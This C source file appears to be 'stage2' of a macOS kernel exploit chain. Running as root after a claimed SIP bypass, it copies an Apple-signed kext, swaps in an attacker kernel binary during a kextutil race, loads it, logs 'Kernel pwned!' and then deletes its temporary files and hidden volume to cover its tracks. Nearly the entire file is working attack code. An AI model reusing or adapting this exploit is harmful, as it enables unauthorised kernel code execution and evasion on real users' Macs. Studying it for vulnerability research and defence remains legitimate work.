//
//  main.c
//  stage2
//
//  Created by Ilias Morad (A2nkF) on 2/24/20.
//  Copyright © 2020 Ilias Morad (A2nkF). All rights reserved.
//


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>


#define VICTIM_KEXT     "acfs"
// Name of an apple signed kext in /System/Library/Extensions/ without the ".kext"
// preferebly one that's not already loaded and isn't required for the system to
// function, since we're going to replace the full binary with our own :P
// It might be useful to replace acfs with another one, depending
// on which symbols the kernel stage requires ;)
                                 
                                 
// -- Logging stuff --

typedef struct {
    mach_msg_header_t header;
    char content[1024];
} out_msg;

#define LOG_DEFAULT     0x4141
#define LOG_FINAL       0x1337

mach_port_t local_port, server_port = MACH_PORT_NULL;

kern_return_t loggerInit() {
    mach_port_t bs_port = MACH_PORT_NULL;
    kern_return_t kr = KERN_FAILURE;
    char server[] = "com.a2nkf.logging";

    if ((kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &local_port)) != KERN_SUCCESS) {
        return kr;
    }
     
    if((kr = task_get_bootstrap_port(mach_task_self(), &bs_port)) != KERN_SUCCESS) {
        return kr;
    }
    
    if((kr = bootstrap_look_up(bs_port, server, &server_port)) != KERN_SUCCESS) {
        return kr;
    }
    
    return KERN_SUCCESS;
}

mach_msg_return_t _log(char *data, mach_msg_id_t status) {
    out_msg msg = {0};
 
    msg.header.msgh_remote_port = server_port;
    msg.header.msgh_local_port = local_port;
    msg.header.msgh_id = status;
    msg.header.msgh_voucher_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND, 0, 0);

    strncpy((char *)&msg.content, data, 1024);
    return mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, mach_task_self());
}

// -- end Logging stuff --


void cleanUp() {
    _log("[~] Cleaning up our mess... ", LOG_DEFAULT);
    system("rm -rf /tmp/.tmp");
    system("hdiutil detach /Volumes/.tmp");
}


void loadKext() {
    FILE *pipe = NULL;

    pipe = popen("/usr/bin/kextutil -i /tmp/.tmp/" VICTIM_KEXT ".kext", "w");

    _log("[1] Started kextutil...", LOG_DEFAULT);

    sleep(2);
    system("cp /Volumes/.tmp/kernel /Library/StagedExtensions/private/tmp/.tmp/" VICTIM_KEXT ".kext/Contents/MacOS/" VICTIM_KEXT);

    _log("[2] Performed overwrite...", LOG_DEFAULT);

    system("kextunload /System/Library/Extensions/" VICTIM_KEXT ".kext");
    fputs("y\n", pipe);
    _log("[3] Loading kext...", LOG_DEFAULT);
    fputs("y\n", pipe);
    _log("[3] Running kext...", LOG_DEFAULT);

    pclose(pipe);
    
    _log("[+] Kernel pwned!", LOG_DEFAULT);
    return;
}

int main(int argc, char *argv[]) {
    
    if(loggerInit() != KERN_SUCCESS) {
        exit(-2);
    }

    _log("[*] Stage started!", LOG_DEFAULT);
    if(!getuid()) {
        _log("[+] Running as uid 0x0", LOG_DEFAULT);
    } else {
        _log("[-] Not running as root! Aborting exploit", LOG_FINAL);
        exit(-1);
    }
    _log("[+] SIP bypassed ;) Preparing Stage 3...", LOG_DEFAULT);

    _log("[~] Getting kext!", LOG_DEFAULT);
    system("rm -rf /tmp/.tmp/*.kext");
    system("rm -rf /Library/StagedExtensions/private/tmp/* /Library/StagedExtensions/private/tmp/.*");
    system("cp -r /System/Library/Extensions/" VICTIM_KEXT ".kext /tmp/.tmp && chown -R root:wheel /tmp/.tmp/" VICTIM_KEXT ".kext");


    loadKext();

    cleanUp();
    _log("[+] Done!", LOG_FINAL);

    return 0;
}
